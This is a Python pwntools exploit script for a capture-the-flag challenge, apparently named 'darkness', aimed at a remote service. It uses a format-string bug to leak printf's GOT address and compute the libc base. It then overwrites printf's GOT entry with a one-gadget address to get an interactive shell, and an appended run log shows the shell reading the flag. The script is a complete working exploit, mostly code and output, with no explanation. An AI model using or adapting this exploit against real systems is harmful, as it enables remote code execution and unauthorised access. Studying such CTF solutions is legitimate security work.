from pwn import *
from libformatstr import FormatStr
import sys
import time

context.bits = 64
#context.log_level = 'debug'

r = remote('167.99.129.209',10003)


def pad(addr):
    return addr + '\x00'*(8-len(addr))

def get_low(addr):
    return int(hex(addr & 0xffffffff).replace('L', ''), 16)

def get_high(addr):
    return int(hex((addr & 0xffffffff00000000) >> 0x20).replace('L', ''), 16)

printf_got = 0x602040
puts_got = 0
system_off = 0x4f550
gadget_off_x = [0x4f3d5, 0x4f432, 0x10a41c]
gadget_off = gadget_off_x[2]

# leak 
r.recvuntil('>')
r.sendline('1')
r.recvuntil('**:')
r.sendline("A"*6 + "%8$s" + "B"*6 + p64(printf_got))
out = r.recvuntil('\n1.')
leak = (out.split('AAAAAA'))[1].split('BBBBBB')[0]
leak = u64(pad(leak))

log.info(f'printf @ {hex(leak)}')

lk_off = 0x64f70

libc_base = leak - lk_off

log.info(f'libc base @ {hex(libc_base)}')

system = libc_base + system_off

log.info(f'system @ {hex(system)}')

gadget = libc_base + gadget_off

log.info(f'gadget @ {hex(gadget)}')

# hijack

r.recvuntil('>')
r.sendline('1')
r.recvuntil('**:')

log.info('Hijacking to one gadget...')

p = FormatStr(isx64=1)

p[printf_got] = get_low(gadget)
p[printf_got+4] = get_high(gadget)

payload = '' + ''
payload += p.payload(6, 0) # 6 = fmt off, 3 = already printed bytes count

if('\n' in payload):
	print('NOOO')

r.sendline(payload)

r.recvuntil('>')

time.sleep(0.5)

r.sendline('a')
r.sendline('a')

r.recvuntil(':')

r.interactive()
r.close()


'''
lockedbyte@pwn:~/Desktop/NETONCTF/darkness$ python exploit.py 
[+] Opening connection to 167.99.129.209 on port 10003: Done
[*] printf @ 0x7f46d4af2f70
[*] libc base @ 0x7f46d4a8e000
[*] system @ 0x7f46d4add550
[*] gadget @ 0x7f46d4b9841c
[*] Hijacking to one gadget...
[*] Switching to interactive mode
 $ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag.txt
NETON{4nd_th3r3_w45_l1ght!!_ec1f6ba63c9c4b9a922feca615ca6023}
$  
'''





